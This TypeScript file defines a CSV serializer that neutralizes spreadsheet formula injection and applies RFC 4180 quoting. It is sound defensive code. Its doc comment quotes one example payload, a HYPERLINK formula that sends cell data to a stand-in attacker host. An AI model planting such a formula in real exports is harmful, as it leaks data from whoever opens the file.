/**
 * Shared CSV cell serializer for client-side exports.
 *
 * Two separate concerns, both required:
 *
 * 1. **Formula injection (CWE-1236).** Excel and LibreOffice evaluate any cell
 *    whose text begins with `=`, `+`, `-`, `@`, tab or CR — and CSV quoting does
 *    not prevent it, because the quotes are stripped during parsing. A staff
 *    member named `=HYPERLINK("http://attacker/"&A1,"Click")` therefore becomes
 *    a live formula on the machine of whoever opens the export. Prefixing with
 *    an apostrophe is the standard mitigation: the cell displays, and
 *    re-imports, as literal text.
 *
 *    A leading `+`/`-` on an otherwise plain number (phone numbers such as
 *    `+9779800000000`, negative amounts) is left alone — those are values, not
 *    formulas, and rewriting them would corrupt the exported figures.
 *
 * 2. **Delimiter escaping.** Values containing a quote, comma or newline are
 *    wrapped in quotes with inner quotes doubled, per RFC 4180.
 */
export const neutralizeCsvFormula = (value: string): string => {
  if (!value) return value;
  const first = value[0]!;
  if (first === "=" || first === "@" || first === "\t" || first === "\r") {
    return `'${value}`;
  }
  if ((first === "+" || first === "-") && !/^[+-][\d.,\s]*$/.test(value)) {
    return `'${value}`;
  }
  return value;
};

/** Serialize one value into a safe, RFC 4180-quoted CSV cell. */
export const csvCell = (value: unknown): string => {
  const text = neutralizeCsvFormula(value == null ? "" : String(value));
  if (/[",\n\r]/.test(text)) return `"${text.replace(/"/g, '""')}"`;
  return text;
};
